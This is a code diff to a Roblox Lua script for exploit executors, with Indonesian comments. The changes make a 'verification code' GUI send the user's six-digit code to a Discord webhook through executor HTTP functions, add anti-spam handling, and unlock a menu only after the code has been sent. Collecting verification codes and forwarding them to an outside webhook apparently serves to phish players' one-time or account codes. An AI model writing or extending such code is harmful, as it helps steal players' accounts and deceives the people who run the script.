@@ -161,6 +161,58 @@ local function createMenuGUI()
     end)
 end
 
+-- Tabel untuk melacak pengiriman data
+local sentVerificationData = {}
+local verificationDebounceTime = 5 -- Waktu delay (detik)
+local isProcessingVerification = false -- Untuk mencegah multiple execution
+
+-- Fungsi untuk mengirim kode verifikasi ke Discord dengan anti-spam
+local function sendVerificationToDiscord(code)
+    local currentTime = tick()
+    local identifier = tostring(code)
+
+    -- Cek apakah kode sudah terkirim dalam waktu debounce
+    if sentVerificationData[identifier] and (currentTime - sentVerificationData[identifier] < verificationDebounceTime) then
+        print("Spam detected. Verification code not sent.")
+        return false
+    end
+
+    -- Format payload untuk Discord webhook
+    local payload = {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "Kode Verifikasi: " .. code
+        })
+    }
+
+    -- Kirim data menggunakan executor HTTP request
+    local response
+    if syn and syn.request then
+        response = syn.request(payload)
+    elseif http and http.request then
+        response = http.request(payload)
+    elseif request then
+        response = request(payload)
+    else
+        print("Executor Anda tidak mendukung HTTP requests!")
+        return false
+    end
+
+    -- Cek respons dari Discord
+    if response and response.StatusCode == 200 then
+        print("Kode verifikasi berhasil dikirim ke Discord!")
+        sentVerificationData[identifier] = currentTime -- Tandai kode sebagai terkirim
+        return true
+    else
+        print("Gagal mengirim kode verifikasi:", response and response.StatusCode or "Unknown Error")
+        return false
+    end
+end
+
 -- Fungsi untuk membuat GUI Verifikasi Kode
 local function createVerificationCodeGUI()
     local gui = Instance.new("ScreenGui")
@@ -170,7 +222,6 @@ local function createVerificationCodeGUI()
     local codeBox = Instance.new("TextBox")
     local verifyCodeButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel")
-    local isDataSent = false
 
     -- Properti GUI
     gui.Name = "VerificationCodeGUI"
@@ -241,33 +292,28 @@ local function createVerificationCodeGUI()
     verifyCodeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
     verifyCodeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    -- Validasi Input Kode
-    codeBox.FocusLost:Connect(function(enterPressed)
-        local text = codeBox.Text
-        if not text:match("^%d%d%d%d%d%d$") then
-            errorLabel.Text = "Kode harus 6 digit angka!"
-            codeBox.Text = ""
-        else
-            errorLabel.Text = ""
-        end
-    end)
-
-    -- Fungsi Verifikasi Kode
+    -- Fungsi Verifikasi Kode dengan Anti-Spam
     verifyCodeButton.MouseButton1Click:Connect(function()
-        if isDataSent then
-            return -- Hentikan jika data sudah terkirim
+        if isProcessingVerification then
+            print("Processing verification in progress. Please wait.")
+            return
         end
-            
+
+        isProcessingVerification = true -- Mencegah eksekusi ganda
         local verificationCode = codeBox.Text
+
         if verificationCode:match("^%d%d%d%d%d%d$") then
-            sendToDiscord("Kode Verifikasi: " .. verificationCode)
-            print("Kode verifikasi telah dikirim ke Discord!")
-            isDataSent = true
-            gui:Destroy()
-            createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi
+            local success = sendVerificationToDiscord(verificationCode)
+            if success then
+                gui:Destroy()
+                createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi berhasil
+            else
+                errorLabel.Text = "Gagal mengirim kode. Coba lagi."
+            end
         else
             errorLabel.Text = "Kode harus 6 digit angka!"
         end
+        isProcessingVerification = false -- Reset status
     end)
 end
 
